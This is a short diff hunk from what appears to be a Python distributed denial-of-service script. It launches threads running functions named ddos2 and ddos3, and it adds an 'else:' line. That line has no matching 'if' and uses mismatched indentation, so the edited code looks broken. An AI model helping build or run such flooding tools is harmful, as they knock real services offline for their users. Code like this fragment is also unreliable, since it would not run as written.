@@ -83,5 +83,6 @@ for y in range(threads):
 		th.start()
 		th = threading.Thread(target = ddos2)
 		th.start()
+        else:
 		th = threading.Thread(target = ddos3)
 		th.start()
